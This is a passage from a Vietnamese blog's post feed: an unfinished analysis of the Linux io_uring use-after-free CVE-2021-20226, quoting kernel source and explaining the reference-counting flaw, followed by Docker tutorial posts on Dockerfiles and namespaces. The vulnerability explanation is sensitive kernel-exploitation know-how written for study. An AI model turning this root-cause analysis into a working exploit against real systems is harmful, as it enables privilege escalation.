support non-blocking read/write attempts */ if (ret == -EAGAIN \u0026amp;\u0026amp; (!(req-\u0026gt;flags \u0026amp; REQ_F_NOWAIT) || (req-\u0026gt;flags \u0026amp; REQ_F_MUST_PUNT))) { punt: if (io_op_defs[req-\u0026gt;opcode].file_table) { ret = io_grab_files(req); if (ret) goto err; } /* * Queued up for async execution, worker will release * submit reference when the iocb is actually submitted. */ io_queue_async_work(req); goto done_req; } ...... } Khi cờ IOSQE_IO_LINK | IOSQE_IO_HARDLINK được sử dụng, thứ tự thực thi sẽ được chỉ định, hoạt động đang thực hiện trước đó sẽ được yêu cầu chuyển sang bất đồng bộ. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 static bool io_submit_sqe(struct io_kiocb *req, const struct io_uring_sqe *sqe, struct io_submit_state *state, struct io_kiocb **link) { ...... /* * If we already have a head request, queue this one for async * submittal once the head completes. If we don\u0026#39;t have a head but * IOSQE_IO_LINK is set in the sqe, start a new head. This one will be * submitted sync once the chain is complete. If none of those * conditions are true (normal request), then just queue it. */ if (*link) { ...... list_add_tail(\u0026amp;req-\u0026gt;link_list, \u0026amp;head-\u0026gt;link_list); /* last request of a link, enqueue the link */ if (!(sqe_flags \u0026amp; (IOSQE_IO_LINK|IOSQE_IO_HARDLINK))) { io_queue_link_head(head); *link = NULL; } } else { ...... if (sqe_flags \u0026amp; (IOSQE_IO_LINK|IOSQE_IO_HARDLINK)) { req-\u0026gt;flags |= REQ_F_LINK; INIT_LIST_HEAD(\u0026amp;req-\u0026gt;link_list); if (io_alloc_async_ctx(req)) { ret = -EAGAIN; goto err_req; } ret = io_req_defer_prep(req, sqe); if (ret) req-\u0026gt;flags |= REQ_F_FAIL_LINK; *link = req; } else { io_queue_sqe(req, sqe); } } return true; } line 12-19 là trường hợp đã tồn tại head request, trong đó: line 12-14 đưa sqe vào đuôi của list. line 16-19 là trường hợp không cờ IOSQE_IO_LINK|IOSQE_IO_HARDLINK không được bật\nNếu không tồn tại head request mà cờ IOSQE_IO_LINK|IOSQE_IO_HARDLINK bật, thì hệ thống sẽ tạo một head mới (line 24), và chuyển sang bất đồng bộ(line 25)\nNói một cách chính xác, với IORING_OP_TIMEOUT có một chút đặc biệt, đó là nó không trả về EAGAIN như những minh họa trên, tuy nhiên tác giả nghĩ đây là một ví dụ dễ để hiểu nên ông ta đã quyết định dùng nó để giải thích, minh họa trong blog của mình.\nKhi thay thêm .flags = IOSQE_IO_HARDLINK thì IORING_OP_TIMEOUT sẽ được thực thi bởi 1 thread khác, còn IORING_OP_READV sẽ được thực thi sau 1s. Tuy nhiên, tại thời điểm tôi thực hiện trên linux kernel 5.8.0-59-generic, thì lại không tồn tại flag IOSQE_IO_HARDLINK, Tôi vẫn không biết lí do trên là do io_uring đã bỏ nó đi để fix lỗi, hay do trong quá trình cài đặt tôi đã bị thiếu gì đó. Và một điều nữa, tác giả sử dụng systemstap để debug rất mượt, còn tôi, trong quá trình follow theo thì lại tốn khá nhiều thời gian cho script này và đến bây giờ vẫn thất bại.\nRõ ràng trên hệ thống chỉ có IOSQE_IO_LINK, nhưng khi bật flag này, như đã nói ở trước đó, kết quả đạt được là không như mong muốn vì sqe[0] chưa hoàn thành nên sqe[1] (IORING_OP_READV) sẽ không thực thi.\nMặc dù nó không đưa ra kết quả như mong muốn (cần dùng IOSQE_IO_HARDLINK) nhưng khi dùng IOSQE_IO_LINK từ phía kernel nhìn xuống ta vẫn thấy IORING_OP_READV và IORING_OP_TIMEOUT vẫn được xử lí như 2 thằng, và IORING_OP_TIMEOUT được xem như worker.\nKết quả trên minh họa cho đoạn code để tạo worker từ kernel như sau: 1 2 3 4 5 6 7 static bool create_io_worker(struct io_wq *wq, struct io_wqe *wqe, int index) { ...... worker-\u0026gt;task = kthread_create_on_node(io_wqe_worker, worker, wqe-\u0026gt;node, \u0026#34;io_wqe_worker-%d/%d\u0026#34;, index, wqe-\u0026gt;node); ...... } Khi io_timeout() được gọi, nó sẽ đặt io_timeout_fn() trong handler và bắt đầu bộ đếm thời gian. Sau khi hết thời gian cho phép (timeout) io_timeout_fn() sẽ được gọi để load các hoạt động được kết nối trong hàng đợi để thực thi bất đồng bộ. Tức là IORING_OP_TIMEOUT không có được đặt vào hàng đợi thực thi bất đồng bộ. Tác giả dùng TIMEOUT để giải thích đơn giản vì khi nhắc tới TIMEOUT chúng ta sẽ liên tưởng ngay tới việc luồng thực thi hiện tại sẽ được dừng lại.\nPrecautions when offloading I/O operations to the Kernel Chúng ta đã thấy hoạt động bất đồng bộ trên io_uring sẽ được thực hiện bởi worker và chạy dưới dạng Kernel Thread. Tuy nhiên cần có một số lưu ý: Vì nó chạy ở dạng Kernel Thread, nên ngữ cảnh thực thi (execution context) sẽ khác với khi được gọi bởi io_uring. Ở đây, execution context ám chỉ cấu trúc task_struct của process và các thông tin tương ứng của nó. Ví dụ như mm (Manage the virtual memory space of the process), cred (holds UID/GID/Capability), file struct (holds a table for file descriptors)\nNếu 1 process khi thực thi ở Kernel Thread mà không tham chiếu đúng để cấu trúc trên khi thực hiện systemcall nó có thể trỏ tới bộ nhớ ảo sai, trỏ tới file description table, hoặc đưa ra các hoạt động đặc quyền với Kernel Thread (quyền hạn như root). Trong CVE này, lỗi xảy ra ở đây, người viết tại thời điểm trên quên chuyển cred và làm cho những hoạt động lúc này có thể được thực thi cùng quyền hạn như root. Mặc dù những hoạt động tương đương với open() tại thời điểm chưa được hiện thực, nên chúng ta không thể đọc file, nhưng chúng ta có thể bắn những thông báo (message) đặc quyền trong sendmsg's với tùy chọn SCM_CREDENTIALS để thông báo cho cơ quan có thẩm quyền của người gửi (sender’s authority). Vấn đề này liên quan tới D-Bus. Do đó, trong io_uring những tham khảo đó được đưa vào worker để worker chia sẻ execution context bằng cách chuyển qua context của nó trước khi thực thi. Ví dụ: trong đoạn code sau đây, tại line 6 và line 9 chúng ta có thể thấy tham khảo tới mm và cred được đưa vào req-\u0026gt;work: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 static inline void io_req_work_grab_env(struct io_kiocb *req, const struct io_op_def *def) { if (!req-\u0026gt;work.mm \u0026amp;\u0026amp; def-\u0026gt;needs_mm) { mmgrab(current-\u0026gt;mm); req-\u0026gt;work.mm = current-\u0026gt;mm; } if (!req-\u0026gt;work.creds) req-\u0026gt;work.creds = get_current_cred(); if (!req-\u0026gt;work.fs \u0026amp;\u0026amp; def-\u0026gt;needs_fs) { spin_lock(\u0026amp;current-\u0026gt;fs-\u0026gt;lock); if (!current-\u0026gt;fs-\u0026gt;in_exec) { req-\u0026gt;work.fs = current-\u0026gt;fs; req-\u0026gt;work.fs-\u0026gt;users++; } else { req-\u0026gt;work.flags |= IO_WQ_WORK_CANCEL; } spin_unlock(\u0026amp;current-\u0026gt;fs-\u0026gt;lock); } if (!req-\u0026gt;work.task_pid) req-\u0026gt;work.task_pid = task_pid_vnr(current); } file struct cũng được đưa vào req-\u0026gt;work ở đoạn code sau:\n1 2 3 4 5 6 7 8 9 10 11 static int io_grab_files(struct io_kiocb *req) { ...... if (fcheck(ctx-\u0026gt;ring_fd) == ctx-\u0026gt;ring_file) { list_add(\u0026amp;req-\u0026gt;inflight_entry, \u0026amp;ctx-\u0026gt;inflight_list); req-\u0026gt;flags |= REQ_F_INFLIGHT; req-\u0026gt;work.files = current-\u0026gt;files; ret = 0; } ...... } Và trước khi nó chuyển sang thực thi dưới dạng kernel thread, worker sẽ thay thế những tham khảo được truyền vào với nội dung hiện tại của nó.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 static void io_worker_handle_work(struct io_worker *worker) __releases(wqe-\u0026gt;lock) { struct io_wq_work *work, *old_work = NULL, *put_work = NULL; struct io_wqe *wqe = worker-\u0026gt;wqe; struct io_wq *wq = wqe-\u0026gt;wq; do { ...... if (work-\u0026gt;files \u0026amp;\u0026amp; current-\u0026gt;files != work-\u0026gt;files) { task_lock(current); current-\u0026gt;files = work-\u0026gt;files; task_unlock(current); } if (work-\u0026gt;fs \u0026amp;\u0026amp; current-\u0026gt;fs != work-\u0026gt;fs) current-\u0026gt;fs = work-\u0026gt;fs; if (work-\u0026gt;mm != worker-\u0026gt;mm) io_wq_switch_mm(worker, work); if (worker-\u0026gt;cur_creds != work-\u0026gt;creds) io_wq_switch_creds(worker, work); ...... work-\u0026gt;func(\u0026amp;work); ...... } while (1); } Vulnerability explanation Reference counter in files_struct structure when sharing with the worker Trong đoạn code sau đây, worker đang chuyển một tham chiếu đến cấu trúc files_struct của luồng đang thực hiện lệnh gọi hệ thống tới cấu trúc mà worker sẽ tham chiếu sau này mà không cần tăng bộ đếm tham chiếu.\n1 2 3 4 5 6 7 8 9 10 11 static int io_grab_files(struct io_kiocb *req) { ...... if (fcheck(ctx-\u0026gt;ring_fd) == ctx-\u0026gt;ring_file) { list_add(\u0026amp;req-\u0026gt;inflight_entry, \u0026amp;ctx-\u0026gt;inflight_list); req-\u0026gt;flags |= REQ_F_INFLIGHT; req-\u0026gt;work.files = current-\u0026gt;files; ret = 0; } ...... } Bằng cách này, khi vào hàng đợi thực thi bất đồng bộ, tham chiếu tới cấu trúc file được giữ lại đầu tiên từ bộ mô tả tệp được chỉ định\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 static int io_req_set_file(struct io_submit_state *state, struct io_kiocb *req, const struct io_uring_sqe *sqe) { struct io_ring_ctx *ctx = req-\u0026gt;ctx; unsigned flags; int fd; flags = READ_ONCE(sqe-\u0026gt;flags); fd = READ_ONCE(sqe-\u0026gt;fd); if (!io_req_needs_file(req, fd)) return 0; if (flags \u0026amp; IOSQE_FIXED_FILE) { if (unlikely(!ctx-\u0026gt;file_data || (unsigned) fd \u0026gt;= ctx-\u0026gt;nr_user_files)) return -EBADF; fd = array_index_nospec(fd, ctx-\u0026gt;nr_user_files); req-\u0026gt;file = io_file_from_index(ctx, fd); if (!req-\u0026gt;file) return -EBADF; req-\u0026gt;flags |= REQ_F_FIXED_FILE; percpu_ref_get(\u0026amp;ctx-\u0026gt;file_data-\u0026gt;refs); } else { if (req-\u0026gt;needs_fixed_file) return -EBADF; trace_io_uring_file_get(ctx, fd); req-\u0026gt;file = io_file_get(state, fd); if (unlikely(!req-\u0026gt;file)) return -EBADF; } return 0; } Do đó, worker không cần phải trích xuất nó từ fd hoặc trỏ tới cấu trúc files_struct một lần nữa. Nếu như thế thì việc không tăng bộ đếm tham chiếu tới files_struct không bị ảnh hưởng gì. Nhưng giả định trên không đúng với Linux Kernel 5.5 trở lên bởi vì những system call sẽ ảnh hưởng tới file descriptor table như open/close/accept đã có sẵn trên io_uring, do đó, chúng ta có thể sử dụng để khai thác. Tuy nhiên,\nChỉ gọi những syscall 1 cách thông thường sẽ chẳng có gì xảy ra khi cấu trúc file_struct đã sẵn sàng, và ko thể tạo ra race condition vì syscall có countermeasures khi xử lí một file bằng nhiều thread. Giải phóng files_struct bằng cách thiết lập reference counter bằng 0 =\u0026gt; 1 process nào đó có thể dùng nó như là file_struct của nó để thực hiện. Một ví dụ như nhà của bạn mà bạn để bảng \u0026ldquo;nhà hoang\u0026rdquo; thì một người nào đó có thể đi vào đó ở, sinh sống. Chúng ta có thể chèn 1 cấu trúc file vào file description table của process mới bằng mở 1 file, nhưng nó sẽ không được reference vì người dùng không sử dụng cố định số lượng file descriptor trong khi lập trình. Mechanism of reference counter in open/close system call Để hiểu reference counter trong cấu trúc file hoạt động như thế nào, trước tiên cần hiểu cách thức hoạt động của open/close. Cách thức này sẽ phụ thuộc vào từng file riêng, nhưng có 1 số điểm chung:\nOpen Tạo 1 cấu trúc file và thiết lập reference counter = 1 1 2 3 4 5 6 7 8 9 10 static struct file *__alloc_file(int flags, const struct cred *cred) { struct file *f; int error; f = kmem_cache_zalloc(filp_cachep, GFP_KERNEL); ...... atomic_long_set(\u0026amp;f-\u0026gt;f_count, 1); ...... return f; } Đăng kí nó vào file description table (fd_install). 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 static long do_sys_openat2(int dfd, const char __user *filename, struct open_how *how) { ...... fd = get_unused_fd_flags(how-\u0026gt;flags); if (fd \u0026gt;= 0) { struct file *f = do_filp_open(dfd, tmp, \u0026amp;op); if (IS_ERR(f)) { put_unused_fd(fd); fd = PTR_ERR(f); } else { fsnotify_open(f); fd_install(fd, f); } } putname(tmp); return fd; } close 1 Xóa trong file description table.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 int __close_fd(struct files_struct *files, unsigned fd) { struct file *file; struct fdtable *fdt; spin_lock(\u0026amp;files-\u0026gt;file_lock); fdt = files_fdtable(files); if (fd \u0026gt;= fdt-\u0026gt;max_fds) goto out_unlock; file = fdt-\u0026gt;fd[fd]; if (!file) goto out_unlock; rcu_assign_pointer(fdt-\u0026gt;fd[fd], NULL); __put_unused_fd(files, fd); spin_unlock(\u0026amp;files-\u0026gt;file_lock); return filp_close(file, files); out_unlock: spin_unlock(\u0026amp;files-\u0026gt;file_lock); return -EBADF; } Giảm reference counter của cấu trúc file (fput) 1 2 3 4 5 6 int filp_close(struct file *filp, fl_owner_t id) { ...... fput(filp); return retval; } Ở đây chú ý tới hàm fget()/fput(). Chúng sẽ tăng hoặc giảm reference counter và fput() sẽ giải phóng của cấu trúc file khi reference counter bằng 0. Nếu chúng ta mở file bằng fget() reference counter sẽ không thể bằng 0 ngay cả khi ta đóng file trước khi gọi fput() (bộ đếm sẽ có gía trị là 1 khi chạy lệnh open(), tăng lên 2 khi gọi fget() và nếu lúc này đóng thì nó sẽ giảm xuống còn 1). Do đó, nếu file bị đóng khi đang sử dụng vẫn không có vấn đề gì, vì reference counter vẫn chưa bằng 0 nên cấu trúc file không thể bị giải phóng.\nXét trường hợp gọi mmap, sẽ có vấn đề xảy ra nếu vùng nhớ được giải phóng trước khi gọi munmap, thậm chí là khi gọi close() rồi mà tiếp tục gọi munmap vẫn sẽ bị lỗi. Do đó, fget() được dùng trong mmap để tránh trường hợp bộ nhớ bị giải phóng.\n1 2 3 4 5 6 7 8 9 10 11 unsigned long ksys_mmap_pgoff(unsigned long addr, unsigned long len, unsigned long prot, unsigned long flags, unsigned long fd, unsigned long pgoff) { struct file *file = NULL; unsigned long retval; if (!(flags \u0026amp; MAP_ANONYMOUS)) { audit_mmap_fd(fd, flags); file = fget(fd); ...... } fdget() which doesn’t change reference counter 2 hàm fdget()/fdput() thường xuyên được sử dụng để tham khảo tới những cấu trúc file được sử dụng nhiều trong system call handlers.\nVí dụ, trong system call read, cấu trúc file được sử dụng giữa fdget()/fdget_pos() và fdput()/fdput_pos() được sử dụng như sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 ssize_t ksys_read(unsigned int fd, char __user *buf, size_t count) { struct fd f = fdget_pos(fd); ssize_t ret = -EBADF; if (f.file) { loff_t pos, *ppos = file_ppos(f.file); if (ppos) { pos = *ppos; ppos = \u0026amp;pos; } ret = vfs_read(f.file, buf, count, ppos); if (ret \u0026gt;= 0 \u0026amp;\u0026amp; ppos) f.file-\u0026gt;f_pos = pos; fdput_pos(f); } return ret; } SYSCALL_DEFINE3(read, unsigned int, fd, char __user *, buf, size_t, count) { return ksys_read(fd, buf, count); } Có một lí do nào đó để hệ thống không cần phải tăng/giảm reference counter của cấu trúc file một cách thường xuyên, có lẽ do ảnh hưởng của bộ nhớ cache(). Do đó, fdget() sẽ không tăng reference counter của cấu trúc file dưới một số điều kiện nhất định. fdget() cuối cùng sẽ gọi hàm __fget_light()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 /* * Lightweight file lookup - no refcnt increment if fd table isn\u0026#39;t shared. * * You can use this instead of fget if you satisfy all of the following * conditions: * 1) You must call fput_light before exiting the syscall and returning control * to userspace (i.e. you cannot remember the returned struct file * after * returning to userspace). * 2) You must not call filp_close on the returned struct file * in between * calls to fget_light and fput_light. * 3) You must not clone the current task in between the calls to fget_light * and fput_light. * * The fput_needed flag returned by fget_light should be passed to the * corresponding fput_light. */ static unsigned long __fget_light(unsigned int fd, fmode_t mask) { struct files_struct *files = current-\u0026gt;files; struct file *file; if (atomic_read(\u0026amp;files-\u0026gt;count) == 1) { file = __fcheck_files(files, fd); if (!file || unlikely(file-\u0026gt;f_mode \u0026amp; mask)) return 0; return (unsigned long)file; } else { file = __fget(fd, mask, 1); if (!file) return 0; return FDPUT_FPUT | (unsigned long)file; } } Trong chương trình đa luồng, file descriptor sẽ được chia sẻ (\u0026amp;file-\u0026gt;count \u0026gt;= 2) và cùng 1 file descriptor trỏ đến đến cùng 1 tệp. Trong trường hợp này, những thread khác có gọi close() trong khi read() vẫn đang thực thi. Lúc này, fdget() của read() system call được gọi để giảm reference counter.\nTuy nhiên, với chương trình chạy đơn luồng khác, tại 1 thời điểm chỉ có 1 thread thực hiện, nên sẽ không thể xảy tra trường hợp trên, do đó, fdget() không cần phải tăng reference counter. Do đó, nó sẽ không tăng reference counter trừ khi file descriptor table được chia sẻ.\nCombining vulnerabilities with the fdget() spec Lỗ hổng từ việc chuyển 1 tham khảo file struct vào 1 cấu trúc worker trỏ tới mà không tăng reference counter và nếu chương trình gốc là đơn luồng, thì \u0026amp;file-\u0026gt;count = 1 dù cho file descripton table được chia sẻ. \u0026amp;files-\u0026gt;count = 1 có nghĩa là fdget() sẽ không tăng reference counter trong cấu trúc file. Do đó, vùng nhớ của cấu trúc file được sự dụng bởi fdget() có thể bị giải phóng ở 1 thời điểm nào đó.\nTóm tắt Lỗi này như sau:\nAIO worker chia sẻ cấu trúc file_struct với thread được gọi, và tại thời điểm, reference counter của cấu trúc files_struct không tăng lên. vì fdget không tăng reference counter của cấu trúc file trong khi reference counter được khởi tạo có giá trị là 1. file được mở bởi fdget()có thể bị đóng và giải phóng trong worker. Vì cấu trúc file bị giải phóng nên lỗi UAF có thể xảy ra. ","description":"khai thác lỗi trên io_uring dẫn tới UAF (chưa hoàn thành)","id":8,"section":"posts","tags":["cve, io_uring"],"title":"Tìm hiểu về CVE-2021-20226","uri":"https://minhlongmt183.github.io/posts/cve-2021-20226/"},{"content":"Tiếp tục với bài trước, hôm nay chúng ta sẽ đi qua những nhánh tiếp theo của docker foundation - những kiến thức nền tảng của docker. Nhìn một cách tổng quan về nội dung của những kiến thức nền tảng\nBuild Container Image Chúng ta sẽ tiến hành build một container image, ở đây chủ yếu ôn lại kiến thức về Dockerfile đã học ở bài trước\nStep 1 - Base Images Tất cả các Docker Images đều bắt đầu từ một base image. Base image này giống với image mà chúng ta tải trực tiếp từ các Registry về để xây dựng các container. Bên cạnh dùng tên, các base image còn dùng tag để phân biệt giữa các phiên bản trong cùng 1 image.\nTrong Dockerfile, ta dùng FROM để chỉ định base image sử dụng. Ví dụ ta muốn dùng một base image là nginx:1.11-alpine thì trong Dockerfile ta sẽ khai báo:\n1 FROM nginx:1.11-alpine Step 2 - Running Commands Có nhiều câu lệnh cần thực thi khi build image, ta có thể chỉ định những lệnh này trong Dockerfile. Chi tiết về những câu lệnh này đã được thảo luận ở phần 6. Ở đây ta dùng lệnh COPY để copy nội dung file index.html đến địa chỉ cụ thể trên docker\n1 2 FROM nginx:1.11-alpine COPY index.html /usr/share/nginx/html Step 3 - Exposing Ports Từ khóa EXPOSE dùng để chỉ định cổng mà ứng dụng có sử dụng khi muốn truy cập vào Docker từ bên ngoài.\nVí dụ, ta muốn chỉ định cổng 80 sẽ cho phép truy cập, ta khai báo như sau:\n1 EXPOSE 80 Step 4 - Default Commands Default Command chỉ định những lệnh sẽ được thực thi sau khi build xong image để tiến hành setup môi trường mà chúng ta mong muốn. Những default command này bắt đầu bằng CMD. Ví dụ, chúng ta muốn chạy câu lệnh nginx -g daemon off; ta sẽ thực thi như sau:\n1 CMD [\u0026#34;nginx\u0026#34;, \u0026#34;-g\u0026#34;, \u0026#34;daemon\u0026#34;, \u0026#34;off;\u0026#34;] Step 5 - Building Containers Kết hợp những câu lệnh trên, ta có một Dockerfile nhưu sau:\n1 2 3 4 FROM nginx:1.11-alpine COPY index.html /usr/share/nginx/html EXPOSE 80 CMD [\u0026#34;nginx\u0026#34;, \u0026#34;-g\u0026#34;, \u0026#34;daemon\u0026#34;, \u0026#34;off;\u0026#34;] Để thực thi và tiến hành build image, ta dùng lệnh docker build:\n1 docker build -t my-image:v1 . Step 6 - Launching New Image Cuối cùng chạy image bằng lệnh docker run.\nVì những kiến thức này chúng ta đều đã thảo luận qua ở những chương trước, nên phần này tôi chỉ đi nhanh qua.\n","description":"Docker Foundation (tiếp theo)","id":9,"section":"posts","tags":["Docker"],"title":"Tìm hiểu và sử dụng docker (P7)","uri":"https://minhlongmt183.github.io/posts/docker_p7/"},{"content":"\rKể từ chương này, mình bắt đầu chuyển qua học nội dụng docker trên katacoda.com. Và cách học mình cũng sẽ khác, tóm tắt bằng sơ đồ tư duy và trình bày lại những gì mình hiểu sau khi học được trên blog theo flow của sơ đồ tư duy. Mục đích của blog này giúp mình ôn lại, hiểu rõ hơn những kiến thức đã học.\rTổng quan về khóa học Trong khóa học này, mình sẽ đi qua một số chủ đề chính như hình bên dưới. Trong những chủ đề này có những chủ đề mới và những chủ đề đã đề cập qua trong khóa học của anh XuanThuLabChanel. Những phần đã nói qua thì sẽ không nói lại mà chỉ ghi chú thêm những mục mới, chưa đề cập ở những phần trước đó.\nWhat is the container Những khái niệm căn bản về container đã được đề cập khá nhiều ở trong bài docker_overview và ở p1 trong chuỗi bài học từ anh XuanThuLabChanel. Trong phần này chúng ta sẽ đi qua một số khái niệm cũng như một số chủ đề:\nnamespaces Khái niệm: Namespace - không gian tên:\nLà một trong những thành phần cơ bản của container.\ngiới hạn những gì các process có thể thấy và truy cập trên hệ thống.\nđịnh nghĩa vị trí inode trên đĩa.\ninode là một cấu trúc dữ liệu trong một hệ thống tập tin Unix - phong cách mô tả của một tập tin hệ thống đối tượng như một tập tin hoặc một thư mục. Số lượng nút trong tài khoản bằng với số lượng tệp và thư mục có trên đó. Hay có thể hiểu, inodes = số files + folder.\nThông qua một namespace, nhiều process khác nhau có thể chia sẻ, giao tiếp với nhau.\nKhi một container bắt đầu chạy, nó sẽ tạo ra một namespace mới cho để các process chạy trong hộp cát (sandboxes) chạy. Bằng cách phân bổ namespace dựa trên các pid, tại thời điểm chạy, một process sẽ truy cập vào namespace tương ứng với pid của mình, việc này giúp cho process có cảm giác chỉ một mình nó chạy trên hệ thống.\nMột số loại biến thể của namespace Trong namespace định nghĩa một số biến thể:\nMount (mnt): mount namespace điều khiển các mount point. Khi tạo, các liên kết từ mount namespace hiện tại được sao chép sang không gian tên mới, nhưng các mount point được tạo sau đó không truyền giữa mount namespace. Cờ sao chép được sử dụng để tạo không gian tên mới thuộc loại này là CLONE_NEWNS - viết tắt của \u0026ldquo;NEW NameSpace\u0026rdquo;. Thuật ngữ này không mang tính mô tả (vì nó không cho biết loại không gian tên nào sẽ được tạo) bởi vì mount namespaces là loại namespace đầu tiên và tại thời điểm, các nhà thiết kế không lường trước được sẽ có bất kỳ loại namespaces nào khác.\nProcess ID(pid): PID namespaces cung cấp những process với tập pid độc lập với những namespace khác. Các PID namespace có thể lồng vào nhau nghĩa là: mỗi process được tạo trong một namespace sẽ có 1 pid, và pid này sẽ được thấy bởi các process ở trong namespace hiện tại ra cho đến namespace đầu tiên. Nghe có vẻ giống như trong công ty, một nhân viên mới vào sẽ có một thông tin và định danh riêng, những thông tin này sẽ được biết bởi sếp anh ta, sếp của sếp, sếp của sếp của sếp 🤣🤣🤣.\nProcess đầu tiên sẽ được gán PID là 1, nó có vị trí giống như chủ tich hội đồng quản trị của công ty, từ trên nhìn xuống có thể thấy tất cả những process khác, và có quyền \u0026ldquo;đuổi\u0026rdquo; tất cả những process dưới trướng của mình.\nUser ID (user): User namespace là một tính năng để cung cấp khả năng phân quyền và phân nhóm người dùng trên nhiều process, khả nằng đã sẵn có từ kernel 3.8. Với quyền admin, có thể xây dựng một container có vẻ như có quyền admin nhưng không thực sự cấp các đặc quyền nâng cao cho các process của người dùng. Giống như PID namespace, user namespace dùng được lồng vào nhau và mỗi user namespace mới được coi là con của user namespace đã tạo ra nó.\nUser namespace chứa một bảng ánh xạ để chuyển đổi các user ID từ container sang hệ thống. Điều này cho phép, ví dụ, người dùng root có user id 0 trong container nhưng thực sự được hệ thống coi là user id 1.400.000 để kiểm tra quyền sở hữu. Một bảng tương tự được sử dụng để ánh xạ group id và kiểm tra quyền sở hữu.\nĐể tạo điều kiện thuận lợi cho việc cô lập đặc quyền của các hành động admin, mỗi loại namespace được coi là thuộc sở hữu của một user namespace dựa trên user namespace đang hoạt động tại thời điểm tạo. Người dùng quyền admin trong user namespace thích hợp sẽ được phép thực hiện các hành động admin trong loại namespace đó. Ví dụ: nếu một process có quyền quản trị để thay đổi địa chỉ IP của giao diện mạng, nó có thể làm như vậy miễn là user namespace của chính nó giống với (hoặc tổ tiên của) user namespace sở hữu network namespace. Do đó user namespace ban đầu có quyền kiểm soát quản trị đối với tất cả các loại user namespace trong hệ thống.\nNetwork (net): Network namespace ảo hóa network stack. Khi được tạo, network namespace chỉ chứa một loopback interface. Mỗi network interface (là physical hay virtual) thể hiện chính xác một namespace và có thể di chuyển giữa các namespace với nhau.\nMột namespace sẽ có tập các địa chỉ IP riêng, chứa những routing table, socket listing, connection tracking table, firewall, và những resources liên quan tới network khác.\nKhi hủy một không gian tên mạng sẽ phá hủy bất kỳ giao diện ảo nào bên trong nó và di chuyển bất kỳ giao diện vật lý nào bên trong nó trở lại không gian tên mạng ban đầu.\nInterprocess Communication (ipc): ipc namespace dùng để cô lập các process trong giao tiếp. Điều này ngăn không cho các quá trình trong các vùng tên IPC khác nhau sử dụng, chẳng hạn như nhóm hàm SHM để thiết lập phạm vi bộ nhớ dùng chung giữa hai quá trình. Thay vào đó, mỗi quá trình sẽ có thể sử dụng cùng một số nhận dạng cho một vùng bộ nhớ dùng chung và tạo ra hai vùng riêng biệt như vậy.\nUTS: UTS namespace (UNIX Time-Sharing) cho phép một hệ thống duy nhất có vẻ như có các tên miền và máy chủ lưu trữ khác nhau cho các quá trình khác nhau. \u0026ldquo;Khi một quy trình tạo một vùng tên UTS mới \u0026hellip; tên máy chủ và miền của vùng tên UTS mới được sao chép từ các giá trị tương ứng trong vùng tên UTS của người gọi\u0026rdquo;.\nCòn nhiều loại biến thể khác, chúng ta có thể xem chúng tại đây. Unshare tool là công cụ giúp chúng ta có thể chạy một process và yêu cầu nó tạo ra một namespace mới. 1 2 3 4 5 6 7 $ sudo unshare --fork --pid --mount-proc bash $ ps PID TTY TIME CMD 1 pts/0 00:00:00 bash 9 pts/0 00:00:00 ps $ exit exit What happens when we share a namespace? Chúng ta có thể liệt kê tất cả những namespace bằng lệnh:\n1 ls -lha /proc/$DBPID/ns/ Một công cụ khác chúng ta có thể dùng đó là nsenter dùng để gán một process vào một không gian tên đã tồn tại, công cụ này sẽ hữu dụng khi debug.\n1 nsenter --target $DBPID --mount --uts --ipc --net --pid ps aux Container images Container images chúng ta đã được học kĩ trong các bài trước, ở đây có một số chú ý nhỏ nhỏ:\nNhững images chứa dữ liệu thô (metadata) để làm cơ sở để xây dựng những image khác. Chúng ta đã biết, images sẽ có nhiều layer, có 1 layer gốc và những layer sau là quá trình chúng ta cài đặt, thiết lâp thêm môi trường khi chạy contaier được sinh ra từ image ban đầu. Ở đây, mỗi tar file được xem như một layer, và tất cả các tar file được giải nén tới cùng môt vị trí thì Learn Docker Foundation Deploying First Docker Container Phần này chúng ta cũng đã trình bày kĩ ở những phần trước, theo sơ đồ, ta có thể thấy, để build một docker container, chúng ta có 5 bước chính:\nStep1: Tìm kiếm image thích hợp thông qua lệnh docker search, tải về bằng docker pull và chạy bằng docker run Step2: Kiểm tra những container đang chạy: docker ps: liệt kê tất cả các container đang chạy và các thông tin về nó docker inspect: cung cấp thông tin chi tiết về một container đang chạy. docker logs: những message mà container đã log khi chạy. Step3: Truy cập vào container đang chạy. Ở đây, đối với một container đang chạy để lấy port của nó ta có thể dùng một trong 2 lệnh: 1 2 docker ps docker port container_id port_number Step 4: Thiết lập chia sẻ dữ liệu giữa container và host cũng như các container với nhau, đảm bảo dữ liệu cần thiết sẽ được lưu khi container bị xóa. Step 5: Chạy container, ở đây có một số thiết lập như -d để chạy nền hay -it để tương tác với shell.\nNhững phần này chúng ta đã được học ở những bài trước. Deploy Static HTML Website as Container Tóm tắt cho phần này\nCreate Dockerfile Docker file là gì? Dockerfile là một dạng file text, không có phần đuôi mở rộng, chứa tập các lệnh mô tả các bước để build một docker image.\nCú pháp của một dockerfile. Cấu trúc chung của một dockerfile có dạng\nINSTRUCTION arguments Trong đó:\nINSTRUCTION: là tên các chỉ thị có trong Dockerfile, mỗi chỉ thị thực hiện một nhiệm vụ nhất định, do dockerfile quy định. Mặc định, lệnh này phải được viết bằng chữ IN HOA arguments: nội dung mà lệnh thực hiện\nVí dụ: 1 2 FROM nginx:alpine COPY . /usr/share/nginx/html Dòng lệnh 1 để định nghĩa base images và dòng lệnh 2 để chỉ thị copy tất cả nội dụng tại vị trí hiện tại vào một địa chỉ cụ thể trên container, ở đây là /usr/share/nginx/html.\nCác chỉ thị chính trong dockerfile FROM\nChỉ định rằng image nào sẽ được làm cơ sở trong quá trình build image để thực thi những câu lệnh tiếp theo. Các image này được tải về từ Public Repository hoặc Private Reppository riêng của mỗi người.\nChỉ thị FROM là bắt buộc và phải được đặt 